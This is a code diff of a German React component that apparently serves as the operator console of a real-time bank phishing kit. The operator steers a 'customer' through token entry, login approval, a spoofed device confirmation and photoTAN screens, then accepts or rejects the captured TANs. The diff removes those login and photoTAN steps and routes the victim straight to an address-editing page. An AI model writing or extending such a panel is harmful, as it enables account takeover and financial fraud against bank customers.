@@ -190,58 +190,11 @@ const AdressLiveCard = () => {
               {!done && (
                 <div className="space-y-3 pt-2 border-t">
                   {phase === "token_waiting" && (
-                    <StepBlock title="Login freigeben">
+                    <StepBlock title="Profilbearbeitung freigeben">
                       <p className="text-xs text-muted-foreground">Kunde hat den Token eingegeben und wartet.</p>
-                      <Button size="sm" onClick={() => setPhase(r, r.show_berater ? "berater" : "login", { last_error: null })}>
-                        Login-Seite anzeigen
+                      <Button size="sm" onClick={() => setPhase(r, r.show_berater ? "berater" : "adress_edit", { last_error: null })}>
+                        Profil-Seite anzeigen
                       </Button>
-                    </StepBlock>
-                  )}
-                  {(phase === "login" || phase === "login_review" || phase === "login_rejected") && (
-                    <StepBlock title="Login prüfen">
-                      <div className="flex flex-wrap gap-2 items-center">
-                        <Button size="sm" variant="destructive" onClick={() => rejectLogin(r)} disabled={!meta?.pin}>
-                          <XCircle className="h-4 w-4 mr-1" />Login ablehnen
-                        </Button>
-                        <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
-                        <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
-                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
-                        </Button>
-                      </div>
-                      {phase === "login" && !meta?.pin && <p className="text-xs text-muted-foreground">Wartet auf Login-Eingabe.</p>}
-                    </StepBlock>
-                  )}
-
-                  {phase === "confirm" && (
-                    <StepBlock title="Gerätebestätigung – PhotoTAN vorbereiten">
-                      <p className="text-xs text-muted-foreground">Kunde sieht „{r.device_name || "iPhone"}". Wartet auf photoTAN-Klick.</p>
-                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} />
-                    </StepBlock>
-                  )}
-
-                  {phase === "login_phototan_request" && (
-                    <StepBlock title="Login-PhotoTAN freigeben">
-                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} />
-                      <Button size="sm" onClick={() => showLoginPhotoTan(r)} disabled={!r.photo_tan_image}>
-                        <CheckCircle2 className="h-4 w-4 mr-1" />Login-PhotoTAN anzeigen
-                      </Button>
-                    </StepBlock>
-                  )}
-
-                  {(phase === "login_phototan" || phase === "login_tan_review" || phase === "login_phototan_rejected") && (
-                    <StepBlock title="Login-TAN prüfen">
-                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} compact />
-                      <div className="flex flex-wrap gap-2">
-                        <Button size="sm" variant="destructive" onClick={() => rejectLoginTan(r)} disabled={!meta?.login_tan}>
-                          <XCircle className="h-4 w-4 mr-1" />Login-TAN ablehnen
-                        </Button>
-                        <Button size="sm" variant="outline" onClick={() => showLoginPhotoTan(r)}>
-                          <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN
-                        </Button>
-                        <Button size="sm" onClick={() => acceptLoginTan(r)} disabled={!meta?.login_tan}>
-                          <CheckCircle2 className="h-4 w-4 mr-1" />Login-TAN akzeptieren → Profil
-                        </Button>
-                      </div>
                     </StepBlock>
                   )}
 
